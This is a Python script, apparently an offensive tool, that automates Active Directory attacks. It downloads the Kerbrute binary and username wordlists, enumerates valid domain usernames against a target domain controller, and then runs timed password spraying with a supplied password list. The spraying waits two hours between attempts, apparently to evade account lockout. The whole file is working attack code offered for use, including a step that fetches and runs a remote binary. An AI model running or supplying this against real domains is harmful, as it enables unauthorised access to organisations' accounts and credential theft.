#!/bin/python3

import argparse
import subprocess
import os
import re
import time
from colorama import Fore, Style

# Define Banner
def printBanner():
    print(Fore.YELLOW + """
  _____                 _
  \_   \_ ____   _____ | | _____        /\ /\___ _ __ _ __  _   _ _ __ ___
   / /\/ '_ \ \ / / _ \| |/ / _ \_____ / //_/ _ \ '__| '_ \| | | | '_ ` _ \
/\/ /_ | | | \ V / (_) |   <  __/_____/ __ \  __/ |  | | | | |_| | | | | | |
\____/ |_| |_|\_/ \___/|_|\_\___|     \/  \/\___|_|  |_| |_|\__,_|_| |_| |_|
    """)
    print(Style.RESET_ALL)

def downloadKerbrute():
    print(Fore.GREEN + "Checking for Kerbrute and Userlists...\n")
    kerbrute_filename = 'kerbrute_linux_amd64'
    kerbrute_url = "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/" + kerbrute_filename
    userlists_urls = [
        "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/john.smith.txt",
        "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jjsmith.txt",
        "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/johnsmith.txt",
        "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt",
        "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/service-accounts.txt"
    ]

    urls_to_download = [kerbrute_url] + userlists_urls
    total_urls = len(urls_to_download)
    downloaded = 0

    for url in urls_to_download:
        filename = url.split('/')[-1]
        if not os.path.exists(filename):
            subprocess.run(['wget', '-q', url])  # '-q' option for quiet mode
            downloaded += 1
            printProgressBar(downloaded, total_urls, prefix='Progress:', length=50)

    if kerbrute_filename in os.listdir('.'):
        subprocess.run(['chmod', '+x', kerbrute_filename])

def invokeKerbrute(domain, dc_ip=None, custom_ulist=None):
    userlists = [custom_ulist] if custom_ulist else [file for file in os.listdir('.') if file.endswith('.txt')]
    total_userlists = len(userlists)
    enumerated = 0
    unique_usernames = set()

    file_mode = 'a' if os.path.exists('validated_users.txt') else 'w'

    for userlist in userlists:
        print(Fore.BLUE + f"Using {userlist} to enumerate {domain}")
        command = ['./kerbrute_linux_amd64', 'userenum', '-d', domain, userlist]
        if dc_ip:
            command.extend(['--dc', dc_ip])

        result = subprocess.run(command, capture_output=True, text=True)
        valid_usernames = re.findall(r'\[\+\] VALID USERNAME:\s+([^\s]+)', result.stdout)
        unique_usernames.update(valid_usernames)

        if "Couldn't find any KDCs for realm" in result.stderr:
            print(Fore.RED + f"Error: Couldn't find any KDCs for realm {domain}. Please specify a Domain Controller with --dc-ip.\n")
            return

        enumerated += 1
        printProgressBar(enumerated, total_userlists, prefix='Progress:', length=50)

    with open('validated_users.txt', file_mode) as validated_users_file:
        for username in unique_usernames:
            validated_users_file.write(username + '\n')

    print(Fore.GREEN + f"\nTotal unique usernames enumerated: {len(unique_usernames)}")


def removeDuplicates():
    with open('validated_users.txt', 'r') as file:
        unique_usernames = set(file.readlines())

    with open('validated_users.txt', 'w') as file:
        file.writelines(unique_usernames)

def printProgressBar(iteration, total, prefix='', suffix='Complete', length=100, fill='█', printEnd="\r"):
    percent = ("{0:.1f}").format(100 * (iteration / float(total)))
    filledLength = int(length * iteration // total)
    bar = fill * filledLength + '-' * (length - filledLength)
    print(f'\r{prefix} |{bar}| {percent}% {suffix}', end=printEnd)
    # Print New Line on Complete
    if iteration == total: 
        print()


def passwordSpray(domain, passlist, dc_ip=None):
    with open(passlist, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        print(Fore.GREEN + f"Executing password spray with password: {password}")

        command = ['./kerbrute_linux_amd64', 'passwordspray', '-d', domain, 'validated_users.txt', password]
        if dc_ip:
            command.extend(['--dc', dc_ip])

        result = subprocess.run(command, capture_output=True, text=True)

        if "Couldn't find any KDCs for realm" in result.stderr:
            print(Fore.RED + f"Error: Couldn't find any KDCs for realm {domain}. Please specify a Domain Controller with --dc-ip.\n")
            return

        # Check for successful sprays
        successful_sprays = re.findall(r'\[\+\] VALID LOGIN: ([^\s]+)', result.stdout)
        for spray in successful_sprays:
            print(Fore.GREEN + f"Successful spray: {spray}")

        print(Fore.YELLOW + "Waiting for 2 hours before the next attempt...")
        time.sleep(7200)  # Sleep for 2 hours (7200 seconds)

def main():
    parser = argparse.ArgumentParser(description='Kerbrute User Enumeration and Password Spray Script')
    parser.add_argument('-d', '--domain', required=True, help='Domain to enumerate')
    parser.add_argument('--dc-ip', help='IP address of the Domain Controller')
    parser.add_argument('--spray', action='store_true', help='Enable password spraying')
    parser.add_argument('--passlist', help='Path to the password list for spraying')
    parser.add_argument('--custom-ulist', help='Path to a custom userlist for Kerbrute')
    args = parser.parse_args()

    printBanner()
    downloadKerbrute()

    if args.custom_ulist:
        invokeKerbrute(args.domain, args.dc_ip, args.custom_ulist)
    else:
        invokeKerbrute(args.domain, args.dc_ip)

    removeDuplicates()

    if args.spray:
        if not args.passlist:
            print(Fore.RED + "Password list is required for password spraying. Please specify with --passlist.")
            return
        passwordSpray(args.domain, args.passlist, args.dc_ip)

if __name__ == '__main__':
    main()
